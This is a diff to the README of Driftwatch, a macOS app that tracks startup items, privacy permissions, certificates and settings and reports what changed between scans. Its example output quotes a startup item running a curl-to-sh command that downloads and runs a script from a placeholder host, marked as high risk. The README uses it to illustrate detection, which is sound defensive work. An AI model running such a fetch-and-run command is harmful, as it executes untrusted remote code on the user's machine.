@@ -8,7 +8,30 @@
 
 Apps quietly add things to your Mac: helpers that start at login, permissions to your camera or files, certificates, network settings. Driftwatch scans these places, keeps a history, and shows you what was added, changed or removed since the last scan, so nothing changes silently.
 
+<p align="center">
+  <picture>
+    <source media="(prefers-color-scheme: dark)" srcset="docs/screenshots/timeline-dark.png">
+    <img src="docs/screenshots/timeline-light.png" width="700" alt="The Driftwatch window. A sidebar lists the areas it watches. The timeline shows the latest scan first: a new startup item, com.example.updater, marked High risk because it downloads code from the internet and runs it; Zoom getting camera access; a new certificate; a Google Chrome update. An older scan below lists two new startup items and a changed SSH settings file.">
+  </picture>
+  <br>
+  <sub>Example data, not a real Mac.</sub>
+</p>
+
 It runs in the menu bar and in a timeline window. Everything stays on your Mac: no account, no network calls.
+
+## What it tells you
+
+Each change gets a short title, one plain sentence about what it is, a risk hint with the reason, and who probably added it. For the item at the top of the screenshot:
+
+> **com.example.updater** (added, Startup items)
+>
+> Starts a program every time you log in. It runs: `/bin/sh -c curl -fsSL https://example.invalid/u.sh | sh`
+>
+> **High risk:** Downloads code from the internet and runs it straight away, a common malware trick.
+>
+> No "Added by" line: Driftwatch can't tell who made it.
+
+The risk is a hint, not a verdict. "Added by" comes from a code signature when there is one; when Driftwatch only guesses from a name or folder, it says "likely". Select a change to see all its details and, for a changed item, what changed.
 
 ## What it watches
 
@@ -58,6 +81,14 @@ open build/Driftwatch.app
 
 The script builds the Rust scanner and the SwiftUI app, puts both in `build/Driftwatch.app`, and signs it ad hoc.
 
+To regenerate the README screenshots from the example data in `docs/screenshots/demo-history.json`:
+
+```bash
+scripts/build-app.sh && scripts/screenshots.sh
+```
+
+It runs a separate copy of the app with a stub scanner that only prints the example data, so your own history and settings are not touched.
+
 ### Full Disk Access
 
 Privacy permissions live in a protected database. To see them, add Driftwatch in System Settings › Privacy & Security › Full Disk Access. Without it, everything else still works and that area shows as unreadable.
@@ -69,6 +100,7 @@ The scanner also works on its own:
 ```bash
 cargo run --release -- scan          # scan and print what changed since the last scan
 cargo run --release -- scan --json   # the same, as JSON
+cargo run --release -- scan --skip btm   # leave out an area (here login & background items, which ask for your password)
 cargo run --release -- history --json --limit 20
 ```
 
